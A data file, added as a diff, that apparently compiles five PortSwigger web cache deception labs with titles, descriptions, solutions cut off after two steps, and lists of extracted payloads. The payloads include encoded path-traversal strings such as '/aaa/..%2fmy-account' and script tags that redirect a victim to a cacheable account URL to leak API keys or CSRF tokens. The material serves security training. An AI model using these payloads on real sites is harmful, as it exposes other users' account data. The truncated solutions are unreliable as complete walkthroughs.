@@ -1,0 +1,137 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization",
+    "category": "web-cache-deception",
+    "title": "Exploiting cache server normalization for web cache deception",
+    "description": "To solve the lab, find the API key for the usercarlos. You can log in to your own account using the following credentials:wiener:peter.",
+    "solution_steps": [
+      "In Burp's browser, log in to the application using the credentials wiener:peter .",
+      "Notice that the response contains your API key."
+    ],
+    "solution": "1. In Burp's browser, log in to the application using the credentials wiener:peter .\n2. Notice that the response contains your API key.",
+    "payloads": [
+      "carlos",
+      "wiener:peter",
+      "GET /my-account",
+      "/my-account/abc",
+      "404 Not Found",
+      "/my-account",
+      "/my-accountabc",
+      "/my-account\u00a7\u00a7abc",
+      "/my-account?abc.js",
+      "/aaa/..%2fmy-account",
+      "/resources",
+      "/aaa/..%2fresources/YOUR-RESOURCE",
+      "X-Cache: miss",
+      "X-Cache",
+      "/resources/..%2fYOUR-RESOURCE"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules",
+    "category": "web-cache-deception",
+    "title": "Exploiting exact-match cache rules for web cache deception",
+    "description": "To solve the lab, change the email address for the useradministrator. You can log in to your own account using the following credentials:wiener:peter.",
+    "solution_steps": [
+      "In Burp's browser, log in to the application using the credentials wiener:peter , then change your email address.",
+      "In Proxy > HTTP history , notice that the email change submission form in the /my-account response contains a CSRF token as a hidden parameter."
+    ],
+    "solution": "1. In Burp's browser, log in to the application using the credentials wiener:peter , then change your email address.\n2. In Proxy > HTTP history , notice that the email change submission form in the /my-account response contains a CSRF token as a hidden parameter.",
+    "payloads": [
+      "administrator",
+      "wiener:peter",
+      "/my-account",
+      "GET /my-account",
+      "/my-account/abc",
+      "404 Not Found",
+      "/my-accountabc",
+      "/my-account\u00a7\u00a7abc",
+      "/my-account?abc.js",
+      "/aaa/..%2fmy-account",
+      "/resources",
+      "/robots.txt",
+      "X-Cache: miss",
+      "X-Cache: hit",
+      "/aaa/..%2frobots.txt"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization",
+    "category": "web-cache-deception",
+    "title": "Exploiting origin server normalization for web cache deception",
+    "description": "To solve the lab, find the API key for the usercarlos. You can log in to your own account using the following credentials:wiener:peter.",
+    "solution_steps": [
+      "In Burp's browser, log in to the application using the credentials wiener:peter .",
+      "Notice that the response contains your API key."
+    ],
+    "solution": "1. In Burp's browser, log in to the application using the credentials wiener:peter .\n2. Notice that the response contains your API key.",
+    "payloads": [
+      "carlos",
+      "wiener:peter",
+      "GET /my-account",
+      "/my-account/abc",
+      "404 Not Found",
+      "/my-account",
+      "/my-accountabc",
+      "/my-account\u00a7\u00a7abc",
+      "/aaa/..%2fmy-account",
+      "/resources",
+      "/resources/..%2fYOUR-RESOURCE",
+      "X-Cache: miss",
+      "X-Cache",
+      "/resources/aaa",
+      "/resources/..%2fmy-account"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters",
+    "category": "web-cache-deception",
+    "title": "Exploiting path delimiters for web cache deception",
+    "description": "To solve the lab, find the API key for the usercarlos. You can log in to your own account using the following credentials:wiener:peter.",
+    "solution_steps": [
+      "In Burp's browser, log in to the application using the credentials wiener:peter .",
+      "Notice that the response contains your API key."
+    ],
+    "solution": "1. In Burp's browser, log in to the application using the credentials wiener:peter .\n2. Notice that the response contains your API key.",
+    "payloads": [
+      "carlos",
+      "wiener:peter",
+      "GET /my-account",
+      "/my-account/abc",
+      "404 Not Found",
+      "/my-account",
+      "/my-accountabc",
+      "/my-account\u00a7\u00a7abc",
+      "/my-account?abc.js",
+      "X-Cache: miss",
+      "X-Cache",
+      "<script>document.location=\"https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js\"</script>",
+      "https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping",
+    "category": "web-cache-deception",
+    "title": "Exploiting path mapping for web cache deception",
+    "description": "To solve the lab, find the API key for the usercarlos. You can log in to your own account using the following credentials:wiener:peter.",
+    "solution_steps": [
+      "In Burp's browser, log in to the application using the credentials wiener:peter .",
+      "Notice that the response contains your API key."
+    ],
+    "solution": "1. In Burp's browser, log in to the application using the credentials wiener:peter .\n2. Notice that the response contains your API key.",
+    "payloads": [
+      "carlos",
+      "wiener:peter",
+      "GET /my-account",
+      "/my-account/abc",
+      "/my-account",
+      "/my-account/abc.js",
+      "X-Cache: miss",
+      "Cache-Control:\n                            max-age=30",
+      "Cache-Control: max-age=30",
+      "X-Cache",
+      "<script>document.location=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js\"</script>",
+      "https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"
+    ]
+  }
+]
